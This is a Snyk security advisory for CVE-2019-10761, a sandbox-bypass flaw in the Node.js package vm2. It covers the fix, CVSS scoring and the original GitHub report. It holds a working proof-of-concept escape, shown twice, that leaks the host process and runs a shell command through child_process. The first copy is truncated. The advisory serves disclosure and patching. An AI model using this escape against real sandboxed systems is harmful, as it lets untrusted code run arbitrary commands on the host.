# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 7 Apr 2019

[CVE-2019-10761  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2019-10761) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-265  (opens in a new tab)](https://cwe.mitre.org/data/definitions/265.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `vm2` to version 3.6.11 or higher.

## Overview

[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.

Affected versions of this package are vulnerable to Sandbox Bypass. It is possible to trigger a `RangeError` exception from the host rather than the "sandboxed" context by reaching the stack call limit with an infinite recursion. The returned object is then used to reference the `mainModule` property of the host code running the script allowing it to spawn a `child_process` and execute arbitrary code.

## PoC by XmiliaH

```
"use strict";
const {VM} = require('vm2');
const untrusted = `
const f = Buffer.prototype.write;
const ft = {
        length: 10,
        utf8Write(){

        }
}
function r(i){
    var x = 0;
    try{
        x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
        return x;
    if(x!==i)
        return x+1;
    try{
        f.call(ft);
    }catch(e){
        return e;
    }
    return null;
}
var i=1;
while(1){
    try{
        i=r(i).constructor.constructor("return process")();
        break;
    }catch(x){
        i++;
    }
}
i.mainModule.require("child_process").execSync("whoami").toString()
`;
try{
    console.log(new VM().run(untrusted));

### CVSS Scores

version 3.1
### Snyk

8.3 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.

  **Changed**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

## Description

![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4&size=48)[XmiliaH](https://github.com/XmiliaH)opened [on Apr 7, 2019](https://github.com/patriksimek/vm2/issues/197#issue-430118407)

It is possible to almost anywhere generate a RangeError: Maximum call stack size exceeded. Sometimes the RangeError will be a host RangeError which is not Contextified.

I tried to make the code as stable as possible.

```
"use strict";
const {VM} = require('vm2');
const untrusted = `
const f = Buffer.prototype.write;
const ft = {
		length: 10,
		utf8Write(){

		}
}
function r(i){
	var x = 0;
	try{
		x = r(i);
	}catch(e){}
	if(typeof(x)!=='number')
		return x;
	if(x!==i)
		return x+1;
	try{
		f.call(ft);
	}catch(e){
		return e;
	}
	return null;
}
var i=1;
while(1){
	try{
		i=r(i).constructor.constructor("return process")();
		break;
	}catch(x){
		i++;
	}
}
i.mainModule.require("child_process").execSync("whoami").toString()
`;
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

I used 11.8.0.
